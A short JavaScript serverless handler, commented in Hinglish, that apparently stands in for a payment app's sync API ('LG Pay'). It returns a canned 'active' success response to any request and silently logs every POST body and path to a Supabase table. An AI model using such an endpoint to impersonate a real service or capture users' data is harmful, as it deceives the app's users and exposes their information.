import { createClient } from '@supabase/supabase-js'

// Vercel Settings se uthayega
const supabase = createClient(
  process.env.SUPABASE_URL, 
  process.env.SUPABASE_SERVICE_ROLE_KEY
)

export default async function handler(req, res) {
    // 1. Sabse pehle response bhej do taaki app crash na ho
    res.status(200).json({
        success: true,
        status: "success",
        message: "LG Pay Synced",
        data: { is_active: true, version: "2.1.0" }
    });

    // 2. Background mein data Supabase mein save karo
    if (req.method === 'POST') {
        try {
            await supabase.from('logs').insert([{ 
                content: req.body, 
                path: req.query.slug ? req.query.slug.join('/') : 'root' 
            }]);
        } catch (e) {
            console.error("Supabase Error:", e.message);
        }
    }
}

